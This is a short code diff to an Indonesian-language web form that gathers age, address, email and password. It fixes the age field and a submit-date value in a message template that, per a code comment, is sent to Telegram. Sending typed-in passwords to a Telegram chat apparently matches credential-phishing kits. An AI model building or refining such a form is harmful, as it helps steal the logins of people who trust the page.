@@ -22,7 +22,7 @@
       <br>
       <label>Umur :</label>
       <br>
-      <input class="1" type="number" data-id="1" placeholder="Umur" required></input>
+      <input class="1" type="number" id="umur" min="0" max="100" placeholder="Umur" required></input>
       <br>
       <label>Alamat :</label>
       <br>
@@ -130,7 +130,7 @@ form.addEventListener('submit', async (event) => {
   Lokasi : ${alamat}
   Email : ${email}
   Kata Sandi : ${kata_sandi}
-  Dikirim Pada : invalid
+  Dikirim Pada : ${submitdate}
   `;
 
   // Kirim data ke Telegram
